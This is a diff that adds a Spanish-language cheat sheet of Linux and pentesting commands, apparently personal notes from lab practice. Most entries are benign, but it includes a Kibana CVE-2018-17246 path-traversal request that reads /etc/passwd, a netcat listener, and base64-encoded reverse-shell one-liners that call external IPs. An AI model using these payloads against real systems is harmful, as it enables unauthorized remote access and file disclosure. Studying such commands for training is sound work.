@@ -1,0 +1,21 @@
+# General
+- `tcpdump -i enp0s3 -w captura.cap -v` -> Capturar tráfico TCP usando adaptador enp0s3 y guardarlo en archivo captura.cap.
+- `wireshark captura.cap` -> Analizar archivo .cap con wireshack.
+- `&>/dev/null` -> Redirigir stderr y stdout al /dev/null.
+- `wireshark & disown` -> Ejecutar proceso o programa en segundo plano.
+- `lsof -i:80` -> Verificar que servicio está corriendo en el puerto indicado.
+- `pdwx 1355887` -> Verificar en que ruta se encuentra el servicio (PID) que se está ejecutando.
+- `tshark -r captura.cap -Y "http" 2>/dev/null` -> Leer los paquetes mediante terminal del archivo .cap, filtrando el resultado por "http".
+- `hostname -I` -> Mi dirección IP.
+- `-t 20` -> Añadir comando a un proceso para ejecutarlo usando 20 hilos en paralelo, lo cual aumenta la velocidad drásticamente.
+- `kill %` -> Matar proceso en segundo plano, el cuál queda después de hacer ctrl + z.
+- `wget enlacedearchivo` -> Descargar archivo de internet desde terminal.
+- `git sparse-checkout init`, `git sparse-checkout set kibana/CVE-2018-17246` -> Dividir el repositorio de github clonado para solo usar la carpeta que se requiere, estando dentro del repositorio descargado.
+- `curl -s -X GET "http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd"` -> Enviar petición HTML a una url, de modo silencioso sin mostrar el verbose (-s), mediante el método GET (-X).
+- `nc -nlvp 443` -> Poner en escucha netcat por el puerto 443.
+- `script /dev/null -c bash` -> Crear consola interactiva de bash.
+- `pushd /home/pastor/` -> Ir a un directorio de trabajo.
+- `popd` -> Regresar al directorio en el cual se ejecutó pushd, en este caso /home/pastor/.
+- `python3 -m http.server 80`  -> Montar servidor en máquina local por el puerto 80 usando python.
+- `echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ1LjMyLjQzLjQ5Lzg4ODkgMD4mMQ== | base64 -d; echo` -> Decodificar cadena en base64 a texto claro y mostrarlo en pantalla sin el # del final.
+- `echo -n "/bin/bash -i >& /dev/tcp/172.17.0.1/4646 0>&1" | base64`    -> Codificar texto en base64, con la opcion -n para no incluir un salto de linea y se vea afectado el resultado.
